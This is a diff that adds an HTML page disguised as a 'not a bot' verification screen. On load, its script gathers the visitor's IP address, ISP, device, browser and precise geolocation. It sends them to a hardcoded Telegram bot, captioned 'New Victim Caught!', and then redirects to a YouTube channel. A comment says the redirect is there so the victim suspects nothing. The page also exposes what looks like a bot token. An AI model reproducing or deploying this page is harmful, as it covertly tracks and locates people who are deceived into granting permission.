@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hacker Colony | Secure Connection</title>
+    <style>
+        body { background-color: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #0f0; padding: 20px; border-radius: 8px; box-shadow: 0 0 15px #0f0; text-align: center; }
+        .loading { font-size: 20px; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="loading">SYSTEM SCANNING...</div>
+        <p>Please Allow Permission to Verify You are Not a Bot</p>
+    </div>
+
+    <script>
+        const token = '8341294834:AAGDMuDZJ8ZYtC6QPnF_3KH_aRJ3wXyg_w0';
+        const chat_id = '7162565886';
+
+        async function catchData() {
+            // IP और ISP प्राप्त करना
+            const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+            
+            // लोकेशन प्राप्त करना
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    const message = `🚀 *New Victim Caught!* 🚀\n\n` +
+                                    `🌐 *IP:* ${ipData.ip}\n` +
+                                    `🏢 *ISP:* ${ipData.org}\n` +
+                                    `📱 *Device:* ${navigator.platform}\n` +
+                                    `🤖 *Browser:* ${navigator.userAgent.split(') ')[0]}) \n` +
+                                    `📍 *Location:* [Open in Google Maps](${mapUrl})\n\n` +
+                                    `*Created by Roshan*`;
+
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chat_id, text: message, parse_mode: 'Markdown' })
+                    });
+                    
+                    // डेटा भेजने के बाद यूट्यूब पर भेज दो ताकि उसे शक न हो
+                    window.location.href = "https://youtube.com/@hackers_colony_tech";
+                }, () => {
+                    alert("Please allow location to continue.");
+                });
+            }
+        }
+        window.onload = catchData;
+    </script>
+</body>
+</html>
